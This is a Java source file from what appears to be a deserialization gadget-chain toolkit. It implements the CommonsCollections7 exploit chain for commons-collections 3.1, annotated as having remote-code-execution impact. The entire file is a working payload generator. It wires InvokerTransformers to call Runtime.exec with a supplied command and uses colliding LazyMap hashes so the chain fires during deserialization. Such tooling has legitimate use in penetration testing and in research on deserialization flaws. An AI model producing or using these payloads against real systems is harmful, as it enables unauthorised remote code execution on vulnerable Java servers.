package org.ses.gadgetbuilder.chains1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.singleparam.EqualsTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.util.HashMap;
import java.util.Map;

@Impact(Impact.RCE)
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({Authors.SCRISTALLI, Authors.HANYRAX, Authors.EDOARDOVIGNATI})
public class CommonsCollections7 extends GadgetChain<EqualsTrampoline> {

    Map lazyMap1;
    Map lazyMap2;

    public CommonsCollections7(EqualsTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    public TrampolineConnector createPayload(String command) throws Exception {
        final String[] execArgs = new String[]{command};

        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        execArgs),
                new ConstantTransformer(1)};

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        this.lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);

        this.lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
        return new TrampolineConnector(lazyMap1, lazyMap2);
    }

    @Override
    protected void postProcessPayload() throws Exception {
        // Needed to ensure hash collision after previous manipulations
        this.lazyMap2.remove("yy");

    }

    @Override
    protected String getStackTrace() {
        return "org.apache.commons.collections.map.AbstractMapDecorator.equals()\n" +
                "java.util.AbstractMap.equals()\n" +
                "org.apache.commons.collections.map.LazyMap.get()\n" +
                "org.apache.commons.collections.functors.ChainedTransformer.transform()\n" +
                "org.apache.commons.collections.functors.ConstantTransformer.transform()\n" +
                "org.apache.commons.collections.functors.InvokerTransformer.transform()\n" +
                "java.lang.reflect.Method.invoke()\n" +
                "java.lang.Runtime.exec()";
    }
}
